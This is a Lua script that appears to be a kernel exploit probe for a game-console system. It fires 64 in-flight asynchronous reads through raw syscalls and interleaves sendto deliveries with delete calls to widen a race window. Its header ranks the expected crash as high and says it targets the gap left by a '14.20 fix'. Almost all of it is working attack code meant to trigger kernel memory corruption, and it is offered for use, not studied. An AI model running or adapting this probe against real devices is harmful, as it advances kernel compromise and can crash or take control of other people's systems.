-- CRASH_CLASS: HIGH
-- PROBE 974a: the wide aio window — 64 in-flight reads, completions and deletes interleaved
--
-- Earlier races used 2-4 objects and a child thread. The 14.20 fix describes a
-- re-acquire after the lock drop, so the interleaving to aim for is many live
-- objects with completions arriving between delete calls. Everything here is
-- non-blocking: sendto uses MSG_DONTWAIT (0x80) and no parent call can sleep.

print("=== PROBE 974a: AIO WIDE WINDOW (64 objects) ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function hi_lo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,to_num(v) end
local function rd(a) local o,v=pcall(function() return to_num(memory.read_dword(a)) end) if o then return v end return -999 end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function addr_of(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end
local function show(tag, ok, rv) if not ok then print("  ["..tag.."] PCALL-FAIL") return end local h,l=hi_lo(rv) print(string.format("  [%s] ret=0x%08X_%08X",tag,h,l)) end

local pid = to_num(mk(20)())
print(string.format("[A] pid=%u", pid))

local sv = memory.alloc(8) wd(sv,0) wd(sv+4,0)
show("socketpair", pcall(function() return mk(135)(uint64(1),uint64(1),uint64(0),uint64(sv)) end))
local fd0, fd1 = rd(sv), rd(sv+4)
print(string.format("  fds = %d, %d", fd0, fd1))
if fd0 <= 0 then print("no socketpair"); return end

local N = 64
local reqs = memory.alloc(0x28*N)
local ids  = memory.alloc(8*N)
local st   = memory.alloc(8*N)
local err  = memory.alloc(8*N)
local buf  = memory.alloc(0x4000)
for i=0,0x28*N-1,4 do wd(reqs+i,0) end
local ba = addr_of(buf)
for i=0,N-1 do
    local r = reqs + i*0x28
    wd(r+0x08, 0x100)
    wd(r+0x10, ba % 4294967296) wd(r+0x14, math.floor(ba/4294967296))
    wd(r+0x20, fd0)
end
print(string.format("[B] buf=0x%X  submit %d", ba, N))
show("submit", pcall(function() return mk(669)(uint64(0x1001),uint64(reqs),uint64(N),uint64(3),uint64(ids)) end))
local missing=0
for i=0,N-1 do if rd(ids+i*4)==0 then missing=missing+1 end end
print(string.format("    ids missing=%d first=0x%08X last=0x%08X", missing, rd(ids), rd(ids+(N-1)*4)))

local msg = memory.alloc(0x100)
for i=0,0xFF,4 do wd(msg+i, 0x41410000 + i) end
local msgp = addr_of(msg)
local zero = 0
local busy = 0
local other = 0
local freed = 0

for round=0,7 do
    -- deliver data for the first half, then delete a different slice
    local sent = 0
    for i=0,3 do
        local ok = pcall(function() return mk(133)(uint64(fd1),uint64(msgp),uint64(0x100),uint64(0x80)) end)
        if ok then sent = sent + 1 end
    end
    local one = memory.alloc(8)
    local eo  = memory.alloc(8)
    local slice = round * 8
    local r0, r1 = 0, 0
    for k=0,7 do
        local idx = (slice + k) % N
        wd(one, rd(ids+idx*4))
        local ok, rv = pcall(function() return mk(662)(uint64(one),uint64(1),uint64(eo)) end)
        if ok then
            local h,l = hi_lo(rv)
            if l == 0 then
                local e = rd(eo)
                if e == 0 then freed = freed + 1 r0 = r0 + 1
                elseif e == 0x80020010 then busy = busy + 1 r1 = r1 + 1
                else other = other + 1 end
            else other = other + 1 end
        end
    end
    pcall(function() return mk(664)(uint64(ids),uint64(N),uint64(st)) end)
    print(string.format("  [R%d] sent=%d freed=%d busy=%d other=%d st0=%d st1=%d",
        round, sent, r0, r1, other, rd(st), rd(st+4)))
end

print(string.format("[Z] totals freed=%d busy=%d other=%d alive pid=%d", freed, busy, other, to_num(mk(20)())))
print("=== COMPLETE ===")
